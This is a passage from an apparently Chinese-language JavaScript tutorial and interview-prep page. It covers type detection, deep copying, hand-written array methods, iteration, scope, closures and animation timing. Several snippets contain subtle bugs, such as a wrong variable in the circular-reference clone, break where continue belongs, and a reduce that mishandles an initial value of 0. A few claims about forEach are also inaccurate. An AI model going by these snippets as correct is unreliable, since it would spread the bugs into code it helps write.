Undefined]'Object.prototype.toString.call(function()&#123;&#125;); // '[object Function]'Object.prototype.toString.call(new Date()); // '[object Date]'Object.prototype.toString.call(new RegExp()); // '[object RegExp]'Object.prototype.toString.call(new Error()); // '[object Error]' js检测一个变量是Array类型 es5方式 方法1：instanceof 123function isArray(arr) &#123; return arr instanceof Array;&#125; 方法2：constrctor 1234function isArray(arr) &#123; // return arr.constructor === Array; return arr.__proto__.constructor === Array;&#125; 方法3：Object.prototype.toString.call（推荐使用此方法） 123function isArray(arr) &#123; return Object.prototype.toString.call(arr) === '[object Array]';&#125; 方法4：Object.getPrototypeOf() 123function isArray(arr) &#123; return Object.getPrototypeOf(arr) === Array.prototype;&#125; 方法5：Array.prototype.isPrototypeOf() 123function isArray(arr) &#123; return Array.prototype.isPrototypeOf(arr);&#125; 注：实际上，除了 Object.prototype.toString.call 这个方法，其余的方法并不绝对正确。如下，使用其他四种方法输出的都是 true： 123var a = &#123; __proto__: Array.prototype&#125;; 我们只是手动指定了某个对象的 __proto__ 属性为 Array.prototype，便导致了该对象继承了 Array 对象，这种毫不负责任的继承方式，使得基于继承的判断方案瞬间土崩瓦解。 参考：简书 判断变量是否为数组 es6方式 方法1：isArray方法123function isArray(arr) &#123; return Array.isArray(arr);&#125; null 和 undefined的区别 实例 12console.log(null == undefined); // trueconsole.log(null === undefined); // false 定义： null: Null类型，代表“空值”，代表一个空对象指针，不指向任何对象地址。 undefined: Undefined类型，当一个声明了一个变量未初始化时，得到的就是 undefined。 何时使用 null ?当使用完一个比较大的对象时，需要对其进行释放内存时，设置为null，这样方便垃圾回收。 js浅拷贝和深拷贝（针对引用类型数据Object） 浅拷贝：重新在堆内存中开辟一个空间，拷贝后新对象获得独立的基本数据类型数据，和原对象共用引用类型数据。浅拷贝的表现： 1234var arr1 = [1, 2, 3]；var arr2 = arr1;arr1.push(4);console.log(arr1, arr2); // [1, 2, 3, 4]、[1, 2, 3, 4] 深拷贝：将数据的基本数据类型和引用类型都拷贝一份，在内存中存在两个数据结构完全相同但是又互相独立的数据。深拷贝的实现方式： 简单引用类型（数组） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// slice、concat、push、unshift、map、forEach、Array.from、Array.of、...运算符、数组解构等// 都只能实现简单引用类型的拷贝// case1: slice// 深拷贝var arr1 = [1, 2, 3];var arr2 = arr1.slice();// var arr2 = arr1.concat([])arr1.push(4);console.log(arr1, arr2); // [1, 2, 3, 4]、[1, 2, 3]// 浅拷贝var arr1 = [&#123;a: 1&#125;, &#123;a: 11&#125;];var arr2 = arr1.slice();// var arr2 = arr1.concat([])arr1[0].a = 111;console.log(arr1, arr2); // [&#123;a: 111&#125;, &#123;a: 11&#125;]、[&#123;a: 111&#125;, &#123;a: 11&#125;]// case2: Array.form// 深拷贝var arr1 = [1, 2, 3];var arr2 = Array.from(new Set(arr1));// var arr2 = Array.of(...arr1);arr1.push(4);console.log(arr1, arr2);// 浅拷贝var arr1 = [&#123;a: 1&#125;, &#123;a: 11&#125;];var arr2 = Array.from(new Set(arr1));// var arr2 = Array.of(...arr1);arr1[0].a = 111;console.log(arr1, arr2);// case3: ...运算符// 深拷贝var arr1 = [1, 2, 3];var arr2 = [...arr1];// var arr2 = new Array(...arr1);// var [...arr2] = arr1;arr1.push(4);console.log(arr1, arr2);// 浅拷贝var arr1 = [&#123;a: 1&#125;, &#123;a: 11&#125;];var arr2 = [...arr1];// var arr2 = new Array(...arr1);// var [...arr2] = arr1;arr1[0].a = 111;console.log(arr1, arr2); 简单引用类型（对象） 123456789101112131415161718// 深拷贝// Object.assign 只能实现简单引用类型的深拷贝var obj1 = &#123;a: 1, b: 2&#125;var obj2 = Object.assign(&#123;&#125;, obj1)obj1.c = 3console.log(obj1, obj2) // &#123;a: 1, b: 2, c: 3&#125;、&#123;a: 1, b: 2&#125;// 浅拷贝var obj1 = &#123;a: &#123;age: 20&#125;&#125;var obj2 = Object.assign(&#123;&#125;, obj1)obj1.a.age = 30console.log(obj1, obj2) // &#123;a: &#123;age: 30&#125;&#125;、&#123;a: &#123;age: 30&#125;&#125;// 注意，如果是新增属性则不会影响源数据var obj1 = &#123;a: &#123;age: 20&#125;, b: &#123;age: 25&#125;&#125;var obj2 = Object.assign(&#123;&#125;, obj1)obj1.c = &#123;age: 30&#125;console.log(obj1, obj2) // &#123;a: &#123;age: 20&#125;, b: &#123;age: 25&#125;, c: &#123;age: 30&#125;&#125;、&#123;a: &#123;age: 20&#125;, b: &#123;age: 25&#125;&#125;// 结论： 以上的方法都是当数组内部为基本类型时为深拷贝，为引用类型是为浅拷贝 JSON.parse(JSON.stringify()); 但无法复制内部的函数 热门库 lodash 提供了一个 _.cloneDeep 的方法; jQuery 提供了一个 $.extend(true, {}, {})， 默认是浅拷贝（第一个参数不传），第一个传输传true为深拷贝; 利用 MessageChannel 的序列号和反序列化实现深拷贝 1234567891011121314151617181920// 注意：当消息包含函数、Symbol等不可序列化的值时，就会报无法克隆的DOM异常function deepClone (obj) &#123; return new Promise((resolve, reject) =&gt; &#123; try &#123; const &#123; port1, port2 &#125; = new MessageChannel() port2.onmessage = function (e) &#123; resolve(e.data) &#125; port1.postMessage(obj) &#125; catch (error) &#123; reject(e) &#125; &#125;)&#125;const oldObj = &#123; a: &#123; b: 1 &#125; &#125;;deepClone(oldObj).then((newObj) =&gt; &#123; console.log(oldObj === newObj); // false newObj.a.b = 2; console.log(oldObj.a.b); // 1&#125;); 手写递归方法 12345678910111213141516171819202122232425262728293031323334353637// 实现深度克隆--只考虑对象/数组function deepClone(target)&#123; let result = Array.isArray(target) ? [] : &#123;&#125;; // 数组和对象的typeof 都是object（此处巧妙使用了typeof，也可以使用Object.prototype.toString.call(target).slice(8, -1)来取到类型Object或Array） if (target &amp;&amp; typeof target === 'object') &#123; // 遍历目标数据(for...in可以遍历对象和数组，后例会介绍其用法) // target为数组时，i表示索引；为对象时，i表示key for (let i in target) &#123; // 只处理自有属性 if (!target.hasOwnProperty(i)) break; // 判断目标结构中的每一项是否存在对象/数组，决定是否需要递归下去 if (target[i] &amp;&amp; typeof target[i] === 'object') &#123; result[i] = deepClone(target[i]); // 子属性仍是对象或数组，则递归执行 &#125; else &#123; result[i] = target[i]; // 不需要递归，value已经能是基本的数据类型 &#125; &#125; &#125; return result;&#125;// 测试：var A = &#123; a: 1, b: &#123;c: 2&#125;,&#125;var B = deepClone(A);A.b.c = 22;console.log(A); // &#123;a: 1, b: &#123;c: 22&#125;&#125;console.log(B); // &#123;a: 1, b: &#123;c: 2&#125;&#125; 手写递归方法（考虑含有循环引用） 1234567891011121314151617function deepClone(obj) &#123; let vistedMap = new Map() function baseClone(target) &#123; if (!(target !== null &amp;&amp; typeof obj === 'object')) return target if(vistedMap.get(target)) return vistedMap.get(target) let result = Array.isArray(target) ? [] : &#123;&#125; vistedMap.set(target, result) const keys = Object.keys(target); for(let i = 0, len = keys.length; i &lt; len; i++) &#123; result[keys[i]] = baseClone(target[keys[i]]) &#125; return result &#125; return baseClone(obj)&#125; js实现map、forEach、filter、reduce高阶函数js实现map方法12345678910111213141516171819202122arr.map(function(item, index, self) &#123; console.log(item, index, self); return 'xxx'&#125;, thisArg); // 参数2可选，表示执行 callback 函数时使用的this 值// 参数是一个回调函数，返回值是一个Array，不需要关心内部处理Array.prototype.newMap = function(fn, context) &#123; // this指向的就是调用者arr if (typeof fn !== "function") &#123; throw new TypeError(`$&#123;fn&#125; is not a function`); &#125; context = Object(context) || global; // 严格模式下，context 为 null 或 undefined 时 Object(context) 返回空对象，不会被赋值为global var newArr = []; for(var i = 0; i &lt; this.length; i++) &#123; newArr.push(fn.call(context, this[i], i, this)); &#125; return newArr;&#125; js实现forEach方法12345678910111213141516171819arr.forEach(function(item, index, self) &#123; console.log(item, index, self);&#125;, thisArg); // 参数2可选，表示执行 callback 函数时使用的this 值// 参数是一个回调函数，返回值是一个Array，不需要关心内部处理Array.prototype.newForEach = function(fn, context) &#123; // this指向的就是调用者arr if (typeof fn !== "function") &#123; throw new TypeError(`$&#123;fn&#125; is not a function`); &#125; context = Object(context) || global; // 严格模式下，context 为 null 或 undefined 时 Object(context) 返回空对象，不会被赋值为global for(var i = 0; i &lt; this.length; i++) &#123; fn.call(context, this[i], i, this); &#125;&#125; js实现filter方法(基本同map)12345678910111213141516171819202122arr.filter(function(item, index, self) &#123; console.log(item, index, self); return true&#125;, thisArg);Array.prototype.newFilter = function (fn, context) &#123; // this指向的就是调用者arr if (typeof fn !== 'function') &#123; throw new TypeError(`$&#123;fn&#125; is not a function`); &#125; context = Object(context) || global; // 严格模式下，context 为 null 或 undefined 时 Object(context) 返回空对象，不会被赋值为global var leftArr = [] for (let i = 0; i &lt; this.length; i++) &#123; if (fn.call(context, this[i], i, this)) &#123; leftArr.push(this[i]) &#125; &#125; return leftArr&#125; js实现reduce方法1234567891011121314151617181920arr.reduce(function(prev, cur, index, arr)&#123; console.log(prev, cur, index, arr);&#125;[, initialValue]);Array.prototype.newReduce = function (fn, initialValue) &#123; // this指向的就是调用者arr if (typeof fn !== "function") &#123; throw new TypeError(`$&#123;fn&#125; is not a function`); &#125; let account = initialValue || this[0]; const startIndex = initialValue ? 0 : 1 for (let i = startIndex; i &lt; this.length; i++) &#123; account = fn(account, this[i], i, this); &#125; return account;&#125; forEach 和 map的区别相同点： 都是循环遍历数组中的每一项 每次执行匿名函数都支持三个参数，参数分别为item（当前每一项），index（索引值），arr（原数组） 匿名函数中的 this 都是指向 window 只能遍历数组 都没有break跳出循环，当想跳出循环可以使用every 和 some方法，参照下例 不同点 map方法返回一个新的数组，数组中的元素为原始数组调用函数处理后的值，map方法不会改变原始数组 map方法不会对空数组进行检测 foreach方法没有返回一个新数组&amp;没有返回值，即处理的是数组本身 foreach方法会对空数组进行检测 map、forEach、every、some、$.each、for…in、es6 for…of等用法map 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051const arr = [ &#123; id: 1, num: 10, &#125;, &#123; id: 2, num: 20, &#125;, &#123; id: 3, num: 30, &#125;];// map()方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。// // 注意事项：// 1、map方法内容应该有一个return语句// 2、原数组不会被修改// 3、不会进行空数组检测// 4、那些已删除或者未初始化的项将被跳过（例如在稀疏数组上，稀疏数组如 new Array(10)）// 场景1：收集所有的idconst arr1 = arr.map((item, index, self) =&gt; &#123; // return item.id; // 收集value值 [1, 2, 3] return &#123;id: item.id&#125;; // 收集键值对 [&#123;id: 1&#125;, &#123;id: 2&#125;, &#123;id: 3&#125;]&#125;);console.log(arr1);// 场景2：将arr每一项中的num乘以2const arr2 = arr.map((item, index, self) =&gt; &#123; return item.num * 2;&#125;);console.log(arr2); // [20, 40, 60]// 场景3：往arr每一项中新增一个name字段，并赋初始值 小明const arr3 = arr.map((item, index, self) =&gt; &#123; return $.extend(item, &#123; name: '小明' &#125;);&#125;);console.log(arr3); // [&#123;id:1, num:10, name:'小明'&#125;, ...]// 场景4，一步操作，同时满足2和3const arr4 = arr.map((item, index, self) =&gt; &#123; return $.extend(item, &#123; num: item.num * 2, name: '小明' &#125;);&#125;);console.log(arr4); // [&#123;id:1, num:20, name:'小明'&#125;, ...] forEach 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152let arr = [ &#123; id: 1, num: 10, &#125;, &#123; id: 2, num: 20, &#125;, &#123; id: 3, num: 30, &#125;];// forEach()方法用于调用数组的每个元素，并将元素传递给回调函数。// // 注意事项：// 1、原数组会被修改// 2、会进行空数组检测// 3、那些已删除或者未初始化的项将被跳过（例如在稀疏数组上，稀疏数组如 new Array(10)）// 4、如果数组在迭代时被修改了，则其他元素会被跳过。如果迭代时删除第二项，则原本的第三项会补到第二项，此时第三项会被跳过// 场景1：收集所有的idlet newArr = [];const arr1 = arr.forEach((item, index, self) =&gt; &#123; newArr.push(item.id); // 收集value值 [1, 2, 3] newArr.push(&#123;id: item.id&#125;); // 手机键值对 [&#123;id: 1&#125;, &#123;id: 2&#125;, &#123;id: 3&#125;]&#125;);console.log(newArr);// 场景2：将arr每一项中的num乘以2arr.forEach((item, index, self) =&gt; &#123; item.num = item.num * 2;&#125;);console.log(arr); // [&#123;id:1, num:20&#125;, ...]// 场景3：往arr每一项中新增一个name字段，并赋初始值 小明arr.forEach((item, index, self) =&gt; &#123; item = $.extend(item, &#123; name: '小明' &#125;);&#125;);console.log(arr3); // [&#123;id:1, num:10, name:'小明'&#125;, ...]// 场景4，一步操作，同时满足2和3arr.forEach((item, index, self) =&gt; &#123; item = $.extend(item, &#123; num: item.num * 2, name: '小明' &#125;);&#125;);console.log(arr4); // [&#123;id:1, num:20, name:'小明'&#125;, ...] every 1234567891011121314151617181920212223242526272829303132let arr = [ &#123; id: 1, num: 10, &#125;, &#123; id: 2, num: 20, &#125;, &#123; id: 3, num: 30, &#125;];// every()方法用于检测数组所有元素是否都符合指定条件// 如果数组中检测到有一个元素不满足，则整个表达式返回 false ，且剩余的元素不会再进行检测。// 如果所有元素都满足条件，则返回 true// 场景1：检测arr中是否所有的项的num都为10arr.every((item, index, self) =&gt; &#123; return item.num === 10;&#125;); // false// 场景2：使用return false 来跳出循环arr.every((item, index, self) =&gt; &#123; if (item.num &gt; 10) &#123; return false; // 跳出循环 &#125; else &#123; console.log(item.num)// 10 return true; &#125;&#125;); some 1234567891011121314151617181920212223242526272829303132let arr = [ &#123; id: 1, num: 10, &#125;, &#123; id: 2, num: 20, &#125;, &#123; id: 3, num: 30, &#125;];// some()方法方法用于检测数组中的元素是否满足指定条件// 如果有一个元素满足条件，则表达式返回true , 剩余的元素不会再执行检测。// 如果没有满足条件的元素，则返回false// 场景1：检测arr中是否所有的项的num都为10arr.some((item, index, self) =&gt; &#123; return item.num === 10;&#125;); // true// 场景2：使用return true 来跳出循环arr.some((item, index, self) =&gt; &#123; if (item.num &gt; 20) &#123; console.log(item.num); // 10、20 return false; &#125; else &#123; return true; // 跳出循环 &#125;&#125;); $.each $.each()是对数组，json和dom结构等的遍历 遍历list 12345678var arr = [100, 200, 300];$.each(arr, (index, item) =&gt; &#123; console.log(index, item);&#125;);// 0 100// 1 200// 2 300 遍历map 123456789101112var obj = &#123; a: 100, b: 200, c: 300&#125;;$.each(obj, (key, value) =&gt; &#123; console.log(key, value)&#125;);// a 100// b 200// c 300 遍历list map 123456789101112131415161718192021222324252627282930var listMap = [ &#123; id: 1, name: '小明' &#125;, &#123; id: 2, name: '小红' &#125;, &#123; id: 3, name: '小白' &#125;];$.each(listMap, (index, item) =&gt; &#123; console.log('outer each:', index, item); $.each(item, (key, value) =&gt; &#123; console.log('inner each:', key, value); &#125;);&#125;);// outer each: 0 &#123;id: 1, name: "小明"&#125;// inner each: id 1// inner each: name 小明// outer each: 1 &#123;id: 2, name: "小红"&#125;// inner each: id 2// inner each: name 小红// outer each: 2 &#123;id: 3, name: "小白"&#125;// inner each: id 3// inner each: name 小白 遍历dom 1234&lt;input name="aaa" type="hidden" value="111" /&gt;&lt;input name="bbb" type="hidden" value="222" /&gt;&lt;input name="ccc" type="hidden" value="333" /&gt;&lt;input name="ddd" type="hidden" value="444" /&gt; 12345678$.each($("[type='hidden']"), (index, element) =&gt; &#123; console.log(index, element.item, element.value);&#125;);// 0 aaa 111// 1 bbb 222// 2 ccc 333// 3 ddd 444 jquery dom 遍历 1$(selector).each(function (index, element) &#123;&#125;); 这种写法常在遍历 Dom 的时候出现。 for…in for…in 语句用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作） for…in 语句取到的是list、string的索引 或 map的key 遍历list 12345678910var list = [10, 20, 30, 40, 50];for (let i in list) &#123; console.log(i, list[i]);&#125;// 0 10// 1 20// 2 30// 3 40// 4 50 遍历string 12345678910var str = 'abcde';for (let i in str) &#123; console.log(i, str[i]);&#125;// 0 a// 1 b// 2 c// 3 d// 4 e 遍历map 12345678910111213var map = &#123; a: 100, b: 200, c: 300&#125;for (let key in map) &#123; console.log(key, map[key]);&#125;// a 100// b 200// c 300 遍历list map 12345678910111213141516171819202122var listMap = [ &#123; id: 1, name: '小明' &#125;, &#123; id: 2, name: '小红' &#125;, &#123; id: 3, name: '小白' &#125;];for (i in listMap) &#123; console.log(i, listMap[i]);&#125;// 0 &#123;id: 1, name: "小明"&#125;// 1 &#123;id: 2, name: "小红"&#125;// 2 &#123;id: 3, name: "小白"&#125; es6 for…of for…of 语句不能对象使用 for…of 语句取到的是list、string的值或map的value，类似于forEach语句 内部支持break、continue 部署了Symbol.iterator遍历器的都可以使用for…of，如Array、String、Map、Set、NodeList、typeArray等 遍历list 12345678910var list = [10, 20, 30, 40, 50];for (let i of list) &#123; console.log(i, list[i]);&#125;// 10 undefined// 20 undefined// 30 undefined// 40 undefined// 50 undefined 遍历string 123456789101112131415161718var str = 'abcde';for (let value of str) &#123; if (value === 'c') break; console.log(value);&#125;// a// bvar str = 'abcde';for (let value of str) &#123; if (value === 'c') continue; console.log(value);&#125;// a// c// d// e 如何让for…of支持map es6 遍历器map set 方法详见阮一峰 Iterator遍历器 转换数组法虽然 for…of 语句不能直接作用在 map 上，但是我们可以使用某些方法将 map 转成数组后再处理，如： 1234567var map = &#123; a: 100, b: 200, c: 300&#125;;console.log(Object.keys); // ['a', 'b', 'c']console.log(Object.values); // [100, 200, 300] 高阶函数高阶函数是指至少满足下列条件之一的函数： 函数可以作为参数被传递 函数可以作为返回值输出 常见的高阶函数：map、filter、reduce、sort、forEach、some、every 作用域与闭包作用域作用域是指程序源代码中定义变量的区域，一段程序代码中所用到的变量并不总是有效的，而限定这个变量的可用性的代码范围就是这个变量的作用域。 在JavaScript中使用的作用域是静态作用域（词法作用域），变量的作用域在变量定义时确认，而不是执行时确认。 在JavaScript中，作用域分为全局作用域和函数作用域。 ES5: 全局作用域、函数作用域 ES6: 新增块级作用域 全局作用域代码在任何地方都可以被访问，window对象的内置对象都拥有全局作用域。 最外层函数和在最外层函数外面定义的变量拥有全局作用域 123456789101112var outVariable = "我是最外层变量"; // 最外层变量function outFun() &#123; // 最外层函数 var inVariable = "内层变量"; function innerFun() &#123; // 内层函数 console.log(inVariable); &#125; innerFun();&#125;console.log(outVariable); // 我是最外层变量outFun(); // 内层变量console.log(inVariable); // inVariable is not definedinnerFun(); // innerFun is not defined 所有末定义直接赋值的变量自动声明为拥有全局作用域 1234567function outFun2() &#123; variable = "未定义直接赋值的变量"; var inVariable2 = "内层变量2";&#125;outFun2(); // 要先执行这个函数，否则根本不知道里面是啥console.log(variable); // 未定义直接赋值的变量console.log(inVariable2); // inVariable2 is not defined 所有 window 对象的属性拥有全局作用域 1234window.namewindow.locationwindow.Math// ... 函数作用域在固定的代码片段中才能被访问。 123456789function doSomething()&#123; var blogName = "浪里行舟"; function innerSay()&#123; alert(blogName); &#125; innerSay();&#125;alert(blogName); //脚本错误innerSay(); //脚本错误 块级作用域使用let、const关键创建块级作用域.在函数内部或代码块中创建 作用域有上下级关系，上下级关系具体看函数在哪个作用域下创建的。 123456789101112var a = 10;var b = 20;function fn () &#123; var a = 100; var c = 200 function fn2 () &#123; var a = 1000; var d = 2000; &#125;&#125;// “fn作用域” 是 “fn2作用域” 的上级 作用域的用处：隔离变量，不同作用域下的同名变量不会有冲突。 作用域是分层的，内层作用域可以访问外层作用域的变量，反之则不行。最后输出的结果为 2, 4, 12 泡泡 1 是全局作用域，有标识符 foo； 泡泡 2 是函数作用域 foo，有标识符 a,bar,b； 泡泡 3 是函数作用域 bar，仅有标识符 c。 块语句，如if、switch、for等不像函数，不会创建新的作用域。块语句中定义的变量将保留在它们已经存在的作用域中 12345if (true) &#123; // 'if' 条件语句块不会创建一个新的作用域 var name = 'Hammad'; // name 依然在全局作用域中&#125;console.log(name); // logs 'Hammad' 作用域链 自由变量：当前作用域中没有定义的变量 1234567var a = 100function fn() &#123; var b = 200 console.log(a) // 这里的a在这里就是一个自由变量 console.log(b)&#125;fn() 自由变量使用时如何查找呢？向父级作用域（创建这个函数的那个域）查找，父级没有，再一层一层向上查找，直到window对象。这种一层一层的关系就叫做作用域链。 123456789101112var a = 100function F1() &#123; var b = 200 function F2() &#123; var c = 300 console.log(a) // 自由变量，顺着作用域链向父作用域找 console.log(b) // 自由变量，顺着作用域链向父作用域找 console.log(c) // 本作用域的变量 &#125; F2()&#125;F1() 自由变量的取值 123456789var x = 10function fn() &#123; console.log(x)&#125;function show(f) &#123; var x = 20 f() // 10，而不是20&#125;show(fn) 问：在 fn 函数中，取自由变量 x 的值时，要到哪个作用域中取？答：要到创建 fn 函数的那个作用域中取，无论 fn 函数将在哪里调用。 执行上下文 范围：一段 &lt;script&gt; 或 一个函数 全局：变量定义、函数声明 函数：变量定义、函数声明、this、arguments 123456789101112// 后面的 var a 实际上会在此处先生成一段 var a = undefined;console.log(a); // undefinedvar a = 100;fn('zhangsan'); // zhangsan 18function fn(name) &#123; // 后面的 var age 实际上会提前执行，先在此处生成一段 var age = undefined; age = 18; console.log(name, age); var age;&#125; 12345// 函数声明function fn1() &#123;&#125;// 函数表达式var fn2 = function() &#123;&#125; 变量、函数声明默认会提前（变量提升），函数表示式不会提前。在函数内部的变量、函数同样也会提前。1234567891011121314fn1(); // 此处调用，可以正常执行function fn1() &#123;&#125;fn1(); // 此处调用，也可以正常执行。fn2(); // 放在前面执行会报错var fn2 = function() &#123;&#125;fn2(); // 对于函数表达式，应该放在后面执行// fn2() 放在前面执行的流程如下：// 在顶部会生成一个 var fn2 = undefined;var fn2 = undefined;fn2(); // 执行相当于执行undefined，所以会报错fn2 = function() &#123;&#125; thisthis 要在执行时才能确认值，定义时无法确认值123456789101112var a = &#123; name: 'A', fn: function() &#123; console.log(this.name); &#125;&#125;a.fn(); // this === aa.fn.call(&#123;name: 'B'&#125;); // this === &#123;name: 'B'&#125;var fn1 = a.fn;fn1(); // this === window 闭包 函数作为返回值 123456789101112function F1() &#123; var a = 100; // 返回一个函数，函数作为返回值 return function () &#123; console.log(a); // a是自由变量，父作用域（申明时的作用域，而不是执行时的作用域）的查找 &#125;&#125;var f1 = F1();var a = 200;f1(); // 100 函数作为参数传递 12345678910111213141516function F1() &#123; var a = 100; // 返回一个函数，函数作为返回值 return function () &#123; console.log(a); // a是自由变量，父作用域的查找 &#125;&#125;var f1 = F1();function F2(fn) &#123; var a = 200; fn(); // 100;&#125;F2(f1); // 将 f1 作为参数传给 F2 注意：var a = new Fn() 的 this 永远为 a，优先级最高，其次是 apply、call、bind这类方法改变this，然后是 obj.foo() 这种指向调用者，最后是直接调用 foo()。同时，箭头函数的 this 一旦被绑定，就不会再被任何方式所改变。 具体看下面的流程图： 面试题：变量提升定义变量、函数时，会默认提到当前作用域的最前面 面试题：this的作用 作为构造函数执行 作为对象属性执行 作为普通函数执行 call apply bind 面试题：创建10个a标签，点击的时候弹出序号常规的思路（错误）：12345678910var i, a;for (i = 0; i &lt; 10; i++) &#123; a = document.createElement('a'); a.innerHTML = i + '&lt;br&gt;'; a.addEventListener('click', function (e) &#123; e.preventDefault(); alert(i); &#125;); document.body.appendChild(a);&#125; 解析：绑定的事件是在后续的时候执行的，因为 i 是一个自由变量，依托的是全局作用域，此时 i 早已变成 10了，所以无论点击哪一个弹出来的都是10 正确写法（使用自执行函数）：123456789101112var i;for (i = 0; i &lt; 10; i++) &#123; (function (i) &#123; var a = document.createElement('a'); a.innerHTML = i + '&lt;br&gt;'; a.addEventListener('click', function (e) &#123; e.preventDefault(); alert(i); &#125;); document.body.appendChild(a); &#125;)(i);&#125; 解析：使用一个自执行函数，将 i 从全局作用域变成了函数作用域，达到输出当前 i 的目的。 面试题：如何理解作用域 自由变量（函数内的变量是函数作用域，函数外的变量是全局作用域） 作用域链，即自由变量如何查找 闭包的2个使用场景 面试题：实际开发中闭包的使用1234567891011121314151617// 闭包在实际应用中主要用于封装变量、收敛权限function isFirstLoad(id) &#123; var _list = []; // 变量_list被封装了，在外部无法获取到该变量 return function (id) &#123; // 使用函数将id的作用域变成函数作用域 if (_list.indexOf(id) &gt; -1) &#123; return false; &#125; else &#123; _list.push(id); return true; &#125; &#125;&#125;var firstLoad = isFirstLoad();firstLoad(10); // true;firstLoad(10); // falsefirstLoad(20); // true 闭包什么是闭包简单的说，Javascript允许使用内部函数（即函数定义和函数表达式位于另一个函数的函数体内）访问它们所在的外部函数中声明的所有局部变量、参数和声明的其他内部函数。当其中一个这样的内部函数在包含它们的外部函数之外被调用时，就会形成闭包。 案例 Demo1 123456789func(1)(2) = 3func(3)(5) = 8由上例推导函数主体function func(num1) &#123; return function func(num2) &#123; return num1 + num2 &#125;&#125; Demo2 123456789101112131415// 设置移动端基准字号function makeSizer(size) &#123; return function() &#123; document.body.style.fontSize = size + 'px'; &#125;;&#125;var size12 = makeSizer(12);var size14 = makeSizer(14);var size16 = makeSizer(16);// 比如设置按钮点击时调用document.getElementById('size-12').onclick = size12;document.getElementById('size-14').onclick = size14;document.getElementById('size-16').onclick = size16; 常见用途 匿名自执行函数我们知道所有的变量，如果不加上var关键字，则默认的会添加到全局对象的属性上去，这样的临时变量加入全局对象有很多坏处，比如：别的函数可能误用这些变量；造成全局对象过于庞大，影响访问速度（因为变量的取值是需要从原型链上遍历的）。除了每次使用变量都是用var关键字外，我们在实际情况下经常遇到这样一种情况，即有的函数只需要执行一次，其内部变量无需维护，比如UI的初始化，那么我们可以使用闭包： 12345678910111213var data= &#123; table : [], tree : &#123;&#125; &#125;; (function(dm)&#123; for(var i = 0; i &lt; dm.table.rows; i++)&#123; var row = dm.table.rows[i]; for(var j = 0; j &lt; row.cells; i++)&#123; drawCell(i, j); &#125; &#125; &#125;)(data); 我们创建了一个匿名的函数，并立即执行它，由于外部无法引用它内部的变量，因此在函数执行完后会立刻释放资源，关键是不污染全局对象。 结果缓存我们开发中会碰到很多情况，设想我们有一个处理过程很耗时的函数对象，每次调用都会花费很长时间，那么我们就需要将计算出来的值存储起来，当调用这个函数的时候，首先在缓存中查找，如果找不到，则进行计算，然后更新缓存并返回值，如果找到了，直接返回查找到的值即可。闭包正是可以做到这一点，因为它不会释放外部的引用，从而函数内部的值可以得以保留。 12345678910111213141516171819202122232425var CachedSearchBox = (function() &#123; var cache = &#123;&#125;, count = []; return &#123; attachSearchBox: function(dsid) &#123; if(dsid in cache)&#123;//如果结果在缓存中 return cache[dsid];//直接返回缓存中的对象 &#125; var fsb = new uikit.webctrl.SearchBox(dsid);//新建 cache[dsid] = fsb;//更新缓存 if(count.length &gt; 100)&#123;//保正缓存的大小&lt;=100 delete cache[count.shift()]; &#125; return fsb; &#125;, clearSearchBox: function(dsid) &#123; if(dsid in cache)&#123; cache[dsid].clearSelection(); &#125; &#125; &#125;; &#125;)(); CachedSearchBox.attachSearchBox("input"); 这样我们在第二次调用的时候，就会从缓存中读取到该对象。 封装代码 123456789101112131415161718192021222324var person = function() &#123; //变量作用域为函数内部，外部无法访问 var name = "default"; return &#123; getName: function() &#123; return name; &#125;, setName: function(newName) &#123; name = newName; &#125; &#125; &#125;(); print(person.name);//直接访问，结果为undefined print(person.getName()); person.setName("abruzzi"); print(person.getName()); 得到结果如下： // undefined // default // abruzzi 实现类和继承 12345678910111213141516171819202122232425262728function Person()&#123; var name = "default"; return &#123; getName: function() &#123; return name; &#125;, setName: function(newName) &#123; name = newName; &#125; &#125; &#125;; var p = new Person();p.setName("Tom");alert(p.getName()); // Tomvar Jack = function()&#123;&#125;;//继承自PersonJack.prototype = new Person();//添加私有方法Jack.prototype.Say = function()&#123; alert("Hello,my name is Jack");&#125;;var j = new Jack();j.setName("Jack");j.Say();alert(j.getName()); 我们定义了Person，它就像一个类，我们new一个Person对象，访问它的方法。下面我们定义了Jack，继承Person，并添加自己的方法。 闭包优缺点 优点 缓存 面向对象中的对象 实现封装，防止变量跑到外层作用域中，发生命名冲突 匿名自执行函数，匿名自执行函数可以减小内存消耗 缺点 内存消耗通常来说，函数的活动对象会随着执行期上下文一起销毁，但是，由于闭包引用另外一个函数的活动对象，因此这个活动对象无法被销毁，这意味着，闭包比一般的函数需要更多的内存消耗。 性能问题使用闭包时，会涉及到跨作用域访问，每次访问都会导致性能损失。因此在脚本中，最好小心使用闭包，它同时会涉及到内存和速度问题。不过我们可以通过把跨作用域变量存储在局部变量中，然后直接访问局部变量，来减轻对执行速度的影响。 实现一个持续的动画css animation1234567891011@keyframes ani&#123; from &#123; top: 0; &#125; to&#123; top: 200px; &#125;&#125;div&#123; animation: ani 5s linear infinite;&#125; js1// 使用requestAnimationFrame requestAnimationFrame和setTimeout区别图像在屏幕上更新的速度（频率），也即屏幕上的图像每秒钟出现的次数，它的单位是赫兹(Hz)。对于一般笔记本电脑，这个频率大概是60Hz。 setTimeout 其实就是通过设置一个间隔时间来不断的改变图像的位置，从而达到动画效果的。但我们会发现，利用seTimeout实现的动画在某些低端机上会出现卡顿、抖动的现象。 setTimeout 的执行步调和屏幕的刷新步调不一致，从而引起丢帧现象 setTimeout 的执行只是在内存中对图像属性进行改变，这个变化必须要等到屏幕下次刷新时才会被更新到屏幕上。如果两者的步调不一致，就可能会导致中间某一帧的操作被跨越过去，而直接更新下一帧的图像。假设屏幕每隔16.7ms刷新一次，而setTimeout每隔10ms设置图像向左移动1px。 requestAnimationFrame 最大的优势是由系统来决定回调函数的执行时机。具体一点讲，如果屏幕刷新率是60Hz,那么回调函数就每16.7ms(1000/60)被执行一次，如果刷新率是75Hz，那么这个时间间隔就变成了1000/75=13.3ms，换句话说就是，requestAnimationFrame 的步伐跟着系统的刷新步伐走，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。 123456789101112var progress = 0;//回调函数function render() &#123; progress += 1; //修改图像的位置 if (progress &lt; 100) &#123; //在动画没有结束前，递归渲染 window.requestAnimationFrame(render); 